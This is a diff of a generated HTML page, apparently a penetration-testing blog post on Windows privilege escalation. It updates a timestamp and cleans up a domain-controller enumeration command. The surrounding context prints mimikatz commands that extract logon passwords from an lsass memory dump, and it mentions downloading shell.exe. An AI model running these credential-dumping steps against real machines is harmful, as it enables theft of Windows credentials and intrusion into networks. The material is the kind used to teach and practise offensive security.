@@ -29,7 +29,7 @@ To download file shell.exe from command line:
 <meta property="og:image" content="http://i.imgur.com/qMduWGa.png">
 <meta property="og:image" content="http://i.imgur.com/KDXJg4Q.png">
 <meta property="og:image" content="http://i.imgur.com/Ds7klQ8.png">
-<meta property="og:updated_time" content="2017-10-10T15:28:32.981Z">
+<meta property="og:updated_time" content="2017-10-10T15:31:06.905Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Windows Privilege Escalation">
 <meta name="twitter:description" content="source
@@ -201,7 +201,7 @@ To download file shell.exe from command line:
 <p>Procdump can be downloaded <a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="external">here</a></p>
 <p>On your machine run mimikatz.<br>Mimikatz can be downloaded <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20170320" target="_blank" rel="external">here</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mimikatz.exe</div><div class="line"></div><div class="line">sekurlsa::minidump lsass.dmp</div><div class="line"></div><div class="line">sekurlsa::logonPasswords</div></pre></td></tr></table></figure>
-<h2 id="Enumerate-Domain-Controllers"><a href="#Enumerate-Domain-Controllers" class="headerlink" title="Enumerate Domain Controllers"></a>Enumerate Domain Controllers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">nltest /dclist:[d](http://savilltech.com)omainname</div><div class="line"></div></pre></td></tr></table></figure>
+<h2 id="Enumerate-Domain-Controllers"><a href="#Enumerate-Domain-Controllers" class="headerlink" title="Enumerate Domain Controllers"></a>Enumerate Domain Controllers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">nltest /dclist:domainname</div><div class="line"></div></pre></td></tr></table></figure>
   </div>
 </article>
 
